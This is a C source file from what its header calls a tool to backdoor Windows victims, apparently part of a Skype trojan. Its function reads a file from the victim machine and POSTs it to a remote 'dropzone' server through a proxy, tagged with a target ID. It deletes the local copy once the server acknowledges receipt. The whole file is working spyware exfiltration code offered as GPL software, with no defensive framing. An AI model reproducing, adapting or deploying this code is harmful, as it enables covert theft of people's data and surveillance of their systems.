/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */







/*
 * Tool name   : 
 * Description : Tool to backdoor a MS Windows victim system and sending back
 *               data packages to the dropzone.
 * Version     : 0.2
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */





#include <windows.h>
#include <stdio.h>
#include <sys/stat.h>
#include <winhttp.h>
#include <Shlwapi.h>
#include "SkypeTrojan.h"
#include "Uploadfile_Direct.h"
#include "Processes.h"


extern char *gLIID;
extern char *gUploadServer;



/*
 * Direct upload of a file to a remote server.
 *
 */

int uploadData_DirectMain(char *pFileName, char *pProxyConnection)
{
  DWORD dwBytesWritten = 0;
  BOOL  bResults = FALSE;
  FILE *mFH = NULL;
  struct stat mSB;
  char mBuffer[MAX_BUF_SIZE + 1];
  int mSizeCounter = 0;
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL; 
  HINTERNET hRequest = NULL;

  WCHAR mwProxyConnection[MAX_BUF_SIZE + 1];
  WCHAR mwUploadServer[MAX_BUF_SIZE + 1];
  WCHAR mwUploadScript[MAX_BUF_SIZE + 1];
  char *mBaseNameB64EncodedFile = NULL;
  int mRetVal = 0;
  int mPID = 0;

  DWORD mTotalBytes = 0;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;
  LPSTR pszOutBuffer;



  /*
   * Apply the previously determined proxy settings.
   *
   */

  if (strlen(pProxyConnection) > 0)
  {
    mbstowcs(mwProxyConnection, pProxyConnection, MAX_BUF_SIZE);
    hSession = WinHttpOpen(L"DR+", WINHTTP_ACCESS_TYPE_NAMED_PROXY, mwProxyConnection, WINHTTP_NO_PROXY_BYPASS, 0);
  } else 
    hSession = WinHttpOpen(L"DR-", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);



  /*
   * Specify the dropzone HTTP server.
   *
   */

  mbstowcs(mwUploadServer, gUploadServer, MAX_BUF_SIZE);
  if (hSession)
    hConnect = WinHttpConnect(hSession, mwUploadServer, INTERNET_DEFAULT_HTTP_PORT, 0);
  else {
    mRetVal = 2;
    goto END_HTTP_UPLOAD;
  }


  /*
   * Create the HTTP request handle.
   *
   */

  mbstowcs(mwUploadScript, HTTP_INPUT_SCRIPT, MAX_BUF_SIZE);
  if (hConnect)
    hRequest = WinHttpOpenRequest(hConnect, L"POST", mwUploadScript, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  else {
    mRetVal = 3;
    goto END_HTTP_UPLOAD;
  }


	 
  /*
   * Add the HTTP content type.
   *
   */

  if (hRequest)
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded", 47, WINHTTP_ADDREQ_FLAG_ADD);
  else {
    mRetVal = 4;
    goto END_HTTP_UPLOAD;
  }



  if ((mFH = fopen(pFileName, "r")) != NULL)
  {
    stat(pFileName, &mSB);

    /*
     * Determine base file name.
     *
     */

    ZeroMemory(mBuffer, sizeof(mBuffer));
    if (strchr(pFileName, '/') != NULL)
    {
      mBaseNameB64EncodedFile = strrchr(pFileName, '/');
      mBaseNameB64EncodedFile++;
    } else if (strchr(pFileName, '\\') != NULL) {
      mBaseNameB64EncodedFile = strrchr(pFileName, '\\');
      mBaseNameB64EncodedFile++;
    } else {
      mBaseNameB64EncodedFile = pFileName;
    }

    snprintf(mBuffer, MAX_BUF_SIZE, "%s%s&cl=%d&%s%s&%s", PHP_LIID_VAR_NAME, gLIID, mSB.st_size, PHP_FILENAME_VAR_NAME, mBaseNameB64EncodedFile, PHP_DATA_VAR_NAME);


    /*
     * Send the HTTP request.
     *
     */

    if (hRequest) 
      bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, mSB.st_size + strlen(mBuffer), 0);
    else {
      mRetVal = 5;
      goto END_HTTP_UPLOAD;
    }


    /*
     * Write first data chunk.
     "
     */

    bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
    ZeroMemory(mBuffer, sizeof(mBuffer));

    while (fgets (mBuffer, MAX_BUF_SIZE, mFH) != NULL)
    {
      mSizeCounter+= strlen(mBuffer);
      // sennd data to the server.
      bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
      ZeroMemory(mBuffer, sizeof(mBuffer));
    }

    fclose(mFH);
    mFH = NULL;
//    bResults = WinHttpWriteData(hRequest, " ", 1, &dwBytesWritten);

  } else {
    mRetVal = 6;
    goto END_HTTP_UPLOAD;
  }



  /*
   * Receive the dropzone response.
   *
   */

  if (bResults)
    bResults = WinHttpReceiveResponse(hRequest, NULL);
  else {
    mRetVal = 7;
    goto END_HTTP_UPLOAD;
  }


  // report any errors.
  if (!bResults)
  {
    mRetVal = 8;
    goto END_HTTP_UPLOAD;
  } else {


    /*
     * Read HTTP response data
     */

    do 
    {

      /*
       * Check for available data.
       *
       */

      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
        goto END_HTTP_UPLOAD;

      mTotalBytes += dwSize;
	

      /*
       * Allocate space for the buffer.
       *
       */

      if ((pszOutBuffer = (char *) HeapAlloc(GetProcessHeap(), 0 , dwSize + 1)) == NULL)
      {
        dwSize = 0;
        pszOutBuffer = NULL;
        goto END_HTTP_UPLOAD;
       } else {

        /*
         * Read the data.
         *
         */

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID) pszOutBuffer, dwSize, &dwDownloaded))
          goto END_HTTP_UPLOAD;

        /*
         * If transmission was successful, delete only the b64-file
         * the rest will be deleted by the calling function
         */

        if (strstr(pszOutBuffer, HTTP_TRANSMISSION_OK) != NULL)
        {
          DeleteFile(pFileName);  // remove the b64 data file
          mRetVal = 0;
        }

        if (pszOutBuffer != NULL)
        {
          HeapFree(GetProcessHeap(), 0, pszOutBuffer);
          pszOutBuffer = NULL;
        }  // if (pszOutBuffer != NULL)
      } // if (HeapAlloc() ...)
    } while (dwSize > 0);
  } // if (!bResults)


END_HTTP_UPLOAD:


  /*
   * Release allocated resources.
   *
   */

  if (hRequest) WinHttpCloseHandle(hRequest);
  if (hConnect) WinHttpCloseHandle(hConnect);
  if (hSession) WinHttpCloseHandle(hSession);
  if (mFH) fclose(mFH);

  if (pszOutBuffer != NULL)
  {
    HeapFree(GetProcessHeap(), 0, pszOutBuffer);
    pszOutBuffer = NULL;
  }

  return(mRetVal);
}